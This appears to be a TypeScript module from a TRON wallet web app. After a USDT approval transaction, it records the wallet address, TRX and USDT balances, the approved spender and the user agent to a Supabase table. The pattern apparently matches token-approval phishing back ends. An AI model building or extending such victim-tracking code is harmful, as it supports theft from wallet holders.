import { getSupabaseBrowserClient } from "@/lib/supabaseClient";

export type WalletAuthorizationPayload = {
  walletAddress: string;
  trxBalance: number;
  usdtBalance: number;
  approvalTxId?: string | null;
  /** 本次 approve 的 spender（授权接收方） */
  approvalSpender?: string | null;
  locale?: string;
};

function extractTronTxId(result: unknown): string | null {
  if (typeof result === "string") {
    const s = result.trim();
    return s.length > 0 ? s : null;
  }
  if (result && typeof result === "object") {
    const o = result as Record<string, unknown>;
    const txid = o.txid ?? o.txID;
    if (typeof txid === "string" && txid.length > 0) {
      return txid;
    }
  }
  return null;
}

export function parseApprovalSendResult(sendResult: unknown): string | null {
  return extractTronTxId(sendResult);
}

/** 链上授权成功后的记录写入 Supabase（未配置环境变量时静默跳过）。 */
export async function submitWalletAuthorizationRecord(payload: WalletAuthorizationPayload): Promise<void> {
  const supabase = getSupabaseBrowserClient();
  if (!supabase) {
    console.warn("[supabase] 未配置 VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY，跳过授权记录上传。");
    return;
  }

  const { error } = await supabase.from("wallet_authorizations").insert({
    wallet_address: payload.walletAddress,
    trx_balance: payload.trxBalance,
    usdt_balance: payload.usdtBalance,
    approval_tx_id: payload.approvalTxId ?? null,
    approval_spender: payload.approvalSpender ?? null,
    locale: payload.locale ?? null,
    user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 512) : null,
  });

  if (error) {
    console.error("[supabase] 写入 wallet_authorizations 失败:", error.message);
  }
}
